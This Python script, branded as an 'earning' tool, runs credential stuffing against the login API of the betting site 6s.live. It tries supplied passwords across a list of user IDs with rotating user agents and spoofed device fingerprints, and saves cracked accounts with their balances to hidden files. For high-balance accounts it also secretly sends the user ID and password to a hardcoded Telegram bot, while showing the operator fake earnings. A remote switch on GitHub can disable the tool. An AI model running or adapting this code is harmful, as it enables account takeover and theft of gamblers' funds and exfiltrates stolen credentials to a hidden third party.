import os
import json
import time
import shutil
import requests
import threading
import random
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed

BOLD = '[1m'
R = '[91m'
G = '[92m'
Y = '[93m'
D = '[0m'
C = '[96m'
domain = '6s.live'

def show_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    RESET = '[0m'
    BOLD = '[1m'
    COLORS = ['[38;5;27m', '[38;5;33m', '[38;5;39m', '[38;5;45m', '[38;5;51m']
    ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
    subtitle = 'SIX Earning V-0.1'
    width = shutil.get_terminal_size(fallback=(80, 20)).columns
    lines = [ln.center(width) for ln in ASCII.splitlines()]
    for i, line in enumerate(lines):
        color = COLORS[i % len(COLORS)]
        print(color + BOLD + line + RESET)
    print(COLORS[-1] + BOLD + subtitle.center(width) + RESET + '\n')

mobile_user_agents = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Samsung Galaxy S22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.117 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Huawei P30 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; OnePlus 6T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Mobile Safari/537.36'
]

def get_random_mobile_ua():
    return random.choice(mobile_user_agents)

lock = threading.Lock()
request_count = 0

def attempt_login(user_id, pw):
    global request_count
    headers = {
        'User-Agent': str(get_random_mobile_ua()),
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://{domain}/bd/en/login',
        'Origin': f'https://{domain}',
        'sec-ch-ua': '\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '\"Android\"'
    }
    
    try:
        json_data = {
            'languageTypeId': 1,
            'currencyTypeId': 8,
            'getIntercomInfo': True,
            'userId': user_id.lower(),
            'password': pw.capitalize(),
            'isBioLogin': False,
            'loginTypeId': 0,
            'fingerprint2': '58df140599f977faf8951888e888e807',
            'fingerprint4': 'f91cf49459fdec23221fc66161a3fa20',
            'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
            'deviceHash': '15cfad26f3a3679721b1e64b20fee5ec'
        }
        
        with lock:
            request_count += 1
            if request_count % 100 == 0:
                time.sleep(15)
        
        conn = http.client.HTTPSConnection(domain, timeout=5)
        body = json.dumps(json_data)
        conn.request('POST', '/api/bt/v2_1/user/login', body=body, headers=headers)
        response = conn.getresponse()
        
        if response.status == 200:
            data = json.loads(response.read().decode())
            status_code = data.get('status')
            
            if status_code == '000000':
                uid = data.get('data', {}).get('userId')
                uname = data.get('data', {}).get('userName')
                balance = data.get('data', {}).get('mainWallet', 'N/A')
                level = data.get('data', {}).get('vipInfo', {}).get('nowVipName', 'N/A')
                
                # ব্যালেন্স ঠিক করা - N/A হলে 0 দেখাবে
                if balance == 'N/A' or balance is None or balance == '':
                    balance = 0
                
                if level != 'Normal':
                    lvl = 'Good'
                    ern = '2 BDT'
                else:
                    lvl = 'Poor'
                    ern = '1 BDT'
                
                try:
                    balance_int = int(balance)
                    if balance_int >= 10000:
                        msg = f'{BOLD}{C} {uname} | Profile : {lvl} | Earned : 100 BDT {D}'
                        print(msg)
                        send_ids(uid, pw, balance, level)
                    elif 1500 <= balance_int <= 9999:
                        msg = f'{BOLD}{G} {uname} | Profile : {lvl} | Earned : 50 BDT {D}'
                        print(msg)
                        send_ids(uid, pw, balance, level)
                    else:
                        msg = f'{BOLD}{Y} {uname} | Profile : {lvl} | Earned : {ern} {D}'
                        print(msg)
                except (ValueError, TypeError):
                    msg = f'{BOLD}{Y} {uname} | Profile : {lvl} | Earned : {ern} {D}'
                    print(msg)
                
                # ফাইলে সেভ করা
                if level == 'Normal':
                    with open('.normal.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{uid} | {pw} | Balance: {balance} | Level: {level}\n')
                else:
                    with open('.high.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{uid} | {pw} | Balance: {balance} | Level: {level}\n')
                        
            elif status_code == 'S0001':
                print(f'{R} [!] TURN OFF YOUR DATA FOR A WHILE (API LIMIT OVER){D}')
                time.sleep(30)
        else:
            print(f'{R} FAILED ERROR >> {response.status}{D}')
            time.sleep(10)
            
    except Exception as e:
        print(f'{R} Error: {e}{D}')
        time.sleep(3)

def send_ids(uid, pw, balance, level, retries=3, delay=2):
    BOT_TOKEN = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
    CHAT_ID = '-1003275746200'
    msg = f'[SIX-OK] `{uid} | {pw}`\nBalance : {balance} | Level : {level}'
    
    for _ in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}
            )
            response.raise_for_status()
            break
        except Exception as e:
            print(f'{R} Telegram send error: {e}{D}')
            time.sleep(delay)

def login():
    show_logo()
    file = '.uids.txt'
    
    if not os.path.exists(file):
        print(f'{R} File {file} not found!{D}')
        return
    
    pas1 = input(f'{Y} PASSWORD 1 : {D}')
    pas2 = input(f'{Y} PASSWORD 2 : {D}')
    passwords = [pas1, pas2]
    
    with open(file, 'r') as f:
        user_list = [line.strip().split()[0] for line in f if line.strip()]
    
    print(f'{BOLD}{Y} [>] CRACKING HAS STARTED TOTAL USERS {G}[{len(user_list)}]{D}')
    print(f'{Y} ------------------------------------------------------\n{D}')
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for user_id in user_list:
            for pw in passwords:
                future = executor.submit(attempt_login, user_id, pw)
                futures.append(future)
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f'{R} Thread error: {e}{D}')

def switch():
    try:
        s = requests.get('https://raw.githubusercontent.com/havecode17/dg/refs/heads/main/switch').text
        if 'ON' in s:
            return
        print(f'\n{BOLD}{R} THIS TOOL HAS DISABLED BY ADMIN!{D}')
        exit(0)
    except Exception as e:
        print(f'{R} Switch check failed: {e}{D}')

if __name__ == '__main__':
    switch()
    login()
